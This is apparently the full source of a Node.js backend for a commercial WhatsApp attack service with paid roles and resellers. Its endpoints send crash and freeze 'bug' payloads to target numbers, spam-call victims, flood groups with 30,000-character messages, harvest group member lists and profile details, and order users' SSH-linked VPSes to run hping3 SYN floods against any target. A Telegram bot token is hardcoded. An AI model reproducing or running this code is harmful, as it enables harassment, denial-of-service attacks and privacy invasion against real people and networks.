const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@whiskeysockets/baileys");
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
let wsClients = {};
let chatList = [];
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "cnxiv", bug_name: "✦BLANK ANDRO" },
  { bug_id: "delay", bug_name: "✦DELAY INVISIBLE" },
  { bug_id: "frezee", bug_name: "✦FREZEE UIX" },
  { bug_id: "forclose", bug_name: "✦FORCLOSE 50-30%" },
  { bug_id: "spam_call", bug_name: "✦PRANK CALL 1% FC " },
];
let cncActive = true;
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

// ============================================================
// 🌐 GLOBAL SENDER SYSTEM
// ============================================================
const globalConnections = {}; // { number: sock }
const GLOBAL_SENDER_FILE = path.join(__dirname, 'globalSenders.json');

function loadGlobalSenders() {
  if (!fs.existsSync(GLOBAL_SENDER_FILE)) fs.writeFileSync(GLOBAL_SENDER_FILE, JSON.stringify([]));
  try { return JSON.parse(fs.readFileSync(GLOBAL_SENDER_FILE)); }
  catch { return []; }
}

function saveGlobalSenders(data) {
  fs.writeFileSync(GLOBAL_SENDER_FILE, JSON.stringify(data, null, 2));
}

// Sensor nomor: 6281234567890 → 6281****890
function censorNumber(num) {
  const s = String(num).replace(/\D/g, '');
  if (s.length <= 6) return s;
  return s.slice(0, 4) + '****' + s.slice(-3);
}

// Ambil random global sender yang aktif
function getActiveGlobalSender() {
  const keys = Object.keys(globalConnections);
  if (!keys.length) return null;
  return globalConnections[keys[Math.floor(Math.random() * keys.length)]];
}

// Jumlah global sender aktif
function countActiveGlobalSenders() {
  return Object.keys(globalConnections).length;
}
// ============================================================

if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

const TOKEN = "8864607977:AAHhSLXFXkA9J9Qb7RqtwJT96mgn76KaU-E";
const bot = new TelegramBot(TOKEN, { polling: true });

const ID_GROUP = [];

const ID_GROUP_UTAMA = [];

function sendToGroups(text, options = {}) {
    for (const groupid of ID_GROUP) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

function sendToGroupsUtama(text, options = {}) {
    for (const groupid of ID_GROUP_UTAMA) {
        bot.sendMessage(groupid, text, options).catch(err => {
            console.error(`Gagal kirim ke ${groupid}:`, err.response?.body || err.message);
        });
    }
}

const OWNER_ID = 8531923942;
  
wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

        if (data.type === 'sessionCheck') {
  const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
  const user = sessionList.find(e => e.sessionKey === data.key);

  if (!user) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Invalid key"
    }));
    return ws.close();
  }

  if (user.androidId !== data.androidId) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Another device has logged in"
    }));
    return ws.close();
  }
}

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

            const interval = setInterval(() => {
            const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

            }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
         console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

const list = chatList
  .filter(m => m.from === username || m.to === username)
  .map(m => (m.from === username ? m.to : m.from));

  ws.send(JSON.stringify({
    type: "chatList",
    users: [...new Set(list)],
  }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

const wsPort = 3519;
server.listen(wsPort, () => {
  console.log(`🟣 Server running on http://localhost:${wsPort}`);
});

const PORT = 3519;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;
  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) { conn.end(); return; }
      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];
        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;
  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
    connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
      connectToAllVPS();
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

const spamCooldown = {};
const cooldowns = {};

app.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "reseller1", "owner", "vip"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const role = user.role || "member";
  const maxQty = role === "vip" ? 10 : 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
    const sock = biz[socketId];
    await sock.updateBlockStatus(jid, "unblock");
    await sock.offerCall(jid, true);
    await sock.updateBlockStatus(jid, "block");
    console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
          const sock = biz[socketId];
          await sock.updateBlockStatus(jid, "unblock");
          await sock.offerCall(jid, true);
          await sock.updateBlockStatus(jid, "block");
          console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
        } catch (err) {
          console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    console.warn("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});

app.get("/raidGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid group link" });

  return res.json({ valid: true, sended: false });
  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["vip", "owner"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const now = Date.now();
  if (cooldowns[user.username] && now - cooldowns[user.username] < 500_000) {
    const wait = Math.ceil((500_000 - (now - cooldowns[user.username])) / 1000);
    return res.json({ valid: false, message: `Cooldown aktif, tunggu ${wait} detik` });
  }

  const bizKeys = Object.keys(biz);
  if (bizKeys.length < 2) return res.json({ valid: false, message: "Need at least 2 bot online" });

  const dir = path.join(__dirname, "assets");
  const stickers = fs.readdirSync(dir).filter(f => f.endsWith(".webp"));
  if (!stickers.length) return res.json({ valid: false, message: "No stickers found" });

  try {
    const pickRandomSock = async (used = []) => {
      const unused = bizKeys.filter(k => !used.includes(k));
      if (!unused.length) throw new Error("No available bots to use");
      const randKey = unused[Math.floor(Math.random() * unused.length)];
      return { sock: biz[randKey], key: randKey };
    };

    const joinGroup = async () => {
      const usedKeys = [];
      while (true) {
        const { sock, key } = await pickRandomSock(usedKeys);
        usedKeys.push(key);
        try {
          const groupJid = await sock.groupAcceptInvite(code);
          return { sock, groupJid };
        } catch (err) {
          if (err.message.includes("not-authorized")) {
            console.log(`[!] ${key} gagal join, coba bot lain...`);
            continue;
          } else {
            throw err;
          }
        }
      }
    };

    const [s1, s2] = await Promise.all([joinGroup(), joinGroup()]);
    res.json({ valid: true, sended: true });

    cooldowns[user.username] = Date.now();

    const raidBot = async (sock, groupJid) => {
      for (let round = 0; round < 2; round++) {
        const sentMsg = await sock.sendMessage(groupJid, {
          text: `[DarkVerse Project]\n` + 'ꦾ'.repeat(30000)
        });
        await new Promise(r => setTimeout(r, 1000));

        const randomStickers = stickers.sort(() => 0.5 - Math.random()).slice(0, 3);
        for (const sticker of randomStickers) {
          const buffer = fs.readFileSync(path.join(dir, sticker));
          await sock.sendMessage(groupJid, { sticker: buffer });
          await gcCrash(sock, groupJid);
          await FreezePackk(sock, groupJid);
          await new Promise(r => setTimeout(r, 300));
        }

        await new Promise(r => setTimeout(r, 600));
      }

      await sock.groupLeave(groupJid);
      await new Promise(r => setTimeout(r, 500));

      const lastMessagesInChat = {
        key: { remoteJid: groupJid, fromMe: true, id: "" },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };
      await sock.chatModify({
        delete: true,
        lastMessages: [lastMessagesInChat]
      }, groupJid);

      console.log(`[!] Selesai raid & hapus chat: ${groupJid}`);
    };

    await Promise.all([
      raidBot(s1.sock, s1.groupJid),
      raidBot(s2.sock, s2.groupJid)
    ]);

    return;
  } catch (err) {
    console.warn("[❌ RAID ERROR]", err.message);
    return res.json({ valid: false, message: "Join or send failed" });
  }
});

app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await sock.groupAcceptInvite(code);
    const metadata = await sock.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await sock.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    console.warn("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/yb0sl3.png",
    title: "CRASH LIGHT",
    desc: "Buy Acces Chat @BangJxoff"
  }
];

app.post("/validate", (req, res) => {
const { username, password, version, androidId } = req.body;

if (!androidId) {
  return res.json({ valid: false, message: "androidId required" });
}

const db = loadDatabase();
const user = db.find(u => u.username === username && u.password === password);

if (!user) return res.json({ valid: false });

if (isExpired(user)) {
  return res.json({ valid: true, expired: true });
}

const keyList = loadKeyList();
const existingSession = keyList.find(e => e.username === username);
if (existingSession && existingSession.androidId !== androidId) {
  console.log(`[📱] Device login baru, override session untuk ${username}`);
}

const key = generateKey();
activeKeys[key] = {
  username,
  created: Date.now(),
  expires: Date.now() + 10 * 60 * 1000,
};

recordKey({
  username,
  key,
  role: user.role || 'member',
  ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
  androidId,
});

return res.json({
  valid: true,
  expired: false,
  key,
  expiredDate: user.expiredDate,
  role: user.role || "member",
  listBug: bugs,
  news
});
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

// ============================================================
// 📤 SEND BUG — Dengan Dukungan Sender Global/Private
// ============================================================
app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  const senderType = req.query.senderType || 'private'; // 'private' | 'global'
  let { target } = req.query;
  target = (target || "").replace(/\D/g, "");
  console.log(`[📤 BUG] Send bug to ${target} | key ${key} | bug: ${bug} | senderType: ${senderType}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  const role = user.role || "member";

  // 🔐 Cek izin global sender — hanya VIP dan owner
  if (senderType === 'global') {
    if (!['vip', 'owner'].includes(role)) {
      return res.json({
        valid: false,
        message: "⚠️ Global sender hanya bisa digunakan oleh VIP dan Owner."
      });
    }
    if (countActiveGlobalSenders() === 0) {
      return res.json({
        valid: false,
        message: "❌ Tidak ada global sender yang aktif saat ini."
      });
    }
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
    member: 300,
    reseller: 240,
    reseller1: 60,
    owner: 0,
    vip: 60,
  };
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`);
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);
  console.log(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role,
    senderType
  });

  // ============ Kirim Bug di Background ============
  setImmediate(async () => {
    console.log("Received Signal");

    const attemptSend = async (sock, retry = false) => {
      try {
        const targetJid = target + "@s.whatsapp.net";
        console.log("Received Signal 2");
        console.log(`${targetJid}`);
        switch (bug) {
          case "cnxiv":
            for (let i = 0; i < 70; i++) {
              await VnXBlank(sock, targetJid);
              await VnXBlankHard(sock, targetJid);
              await Boom(sock, targetJid);
              await xxx(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "delay":
            for (let i = 0; i < 100; i++) {
              await VnXdelayJmbd(sock, targetJid);
              await DelayFreezerXv2(sock, targetJid);
              await DelayJawaSuma(sock, targetJid);
            }
            break;
          case "frezee":
            for (let i = 0; i < 50; i++) {
              await FreezeByMia(sock, targetJid);
              await FreezerXDelay(sock, targetJid);
            }
            break;
          case "forclose":
            for (let i = 0; i < 2500; i++) {
              await FCBYDENIS(sock, targetJid);
              await FCBYDENIS(sock, targetJid);
              await freezeFcClick(sock, targetJid);
              await FcMybe(sock, targetJid);
              await iosTrashLocExtend(sock, targetJid);
              await iOSxTend(sock, targetJid);
              await FcNoClick(sock, targetJid);
              await sleep(1500);
            }
            break;
          case "spam_call":
            for (let i = 0; i < 20; i++) {
              await forcelippcall(sock, targetJid);
              await sleep(1000);
            }
            break;
        }

        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${target} via ${senderType} sender`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
        if (!retry) {
          let retrySock = null;
          if (senderType === 'global') {
            retrySock = getActiveGlobalSender();
          } else {
            retrySock = await checkActiveSessionInFolder(user.username);
          }
          if (retrySock) return await attemptSend(retrySock, true);
        }
        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}`);
        return false;
      }
    };

    let sock;
    if (senderType === 'global') {
      sock = getActiveGlobalSender();
      if (!sock) {
        console.warn(`[❌ NO GLOBAL SOCK] Tidak ada global sender aktif.`);
        return;
      }
      console.log(`[🌐 GLOBAL SENDER] Menggunakan global sender untuk ${target}`);
    } else {
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌ NO SOCK] Tidak ada koneksi aktif tersedia.`);
        return;
      }
    }

    await attemptSend(sock);
  });
});
// ============================================================

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({ sessionName: sessionName });
    }
  }

  return activeCreds;
}

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  console.log(user.username);
  return res.json({
    valid: true,
    connections: conns
  });
});

// ============================================================
// 🌐 GET GLOBAL SENDERS — Untuk Apk Flutter (list + sensor)
// ============================================================
app.get("/getGlobalSenders", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });

  const senders = loadGlobalSenders();

  const result = senders.map(s => ({
    number: censorNumber(s.number),      // nomor tersensor
    active: !!globalConnections[s.number], // status real-time
    addedAt: s.addedAt || null
  }));

  return res.json({
    valid: true,
    total: result.length,
    active: result.filter(s => s.active).length,
    senders: result
  });
});
// ============================================================

// ============================================================
// ❌ REMOVE GLOBAL SENDER — Owner only
// ============================================================
app.post("/removeGlobalSender", (req, res) => {
  const { key, number } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || user.role !== 'owner') {
